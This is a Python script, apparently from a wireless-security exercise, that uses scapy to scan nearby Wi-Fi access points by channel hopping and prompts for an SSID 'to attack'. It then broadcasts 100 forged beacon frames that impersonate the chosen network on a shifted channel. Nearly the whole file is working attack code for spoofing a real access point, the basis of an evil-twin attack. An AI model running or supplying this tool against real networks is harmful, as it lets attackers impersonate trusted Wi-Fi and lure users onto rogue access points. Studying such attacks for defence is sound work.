#! /usr/bin/env python
from socket import timeout
from scapy.all import *
from threading import Thread
import pandas
import time
import os

# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "Channel", "dBm_Signal"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)

def callback(packet):
    '''Process the Beacon packet in parameter to extract various informations'''
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        networks.loc[bssid] = (ssid, channel, dbm_signal)

change_channel_running = True

def change_channel():
    '''Change de Wi-Fi card listenning channel from 1 to 14 each 0.5s'''
    ch = 1
    while change_channel_running:
        os.system(f"iwconfig {interface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)


if __name__ == "__main__":
    # interface name, check using iwconfig
    interface = "wlan0"
    # start the channel changer
    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()
    # start sniffing
    print("Scanning for nearby Wi-Fi for 10 seconds...")
    sniff(prn=callback, iface=interface, timeout=10)
    # stop the channel changer
    change_channel_running = False
    channel_changer.join()
    # let user choose what SSID to attack
    print(networks)
    print('Type the SSID to attack:')
    chosen_ssid = input()
    # check if chosen ssid exists
    while chosen_ssid not in networks.values:
        print('Type the SSID to attack:')
        chosen_ssid = input()

    chosen_network = networks.loc[networks['SSID'] == chosen_ssid]
    # generate a beacon with chosen SSID
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2='22:22:22:22:22:22', addr3='33:33:33:33:33:33')
    essid = Dot11Elt(ID='SSID',info=chosen_ssid, len=len(chosen_ssid))

    frame = RadioTap()/dot11/Dot11Beacon()/essid
    # set the channel
    channel_to_send = (chosen_network.iloc[0]['Channel'] + 6) % 14
    print("switching to channel " + str(channel_to_send))
    os.system(f"iwconfig {interface} channel {channel_to_send}")
    # send the beacon frame 100 times with inter time 0.1s
    sendp(frame, inter=0.1, count=100, iface=interface, verbose=1)
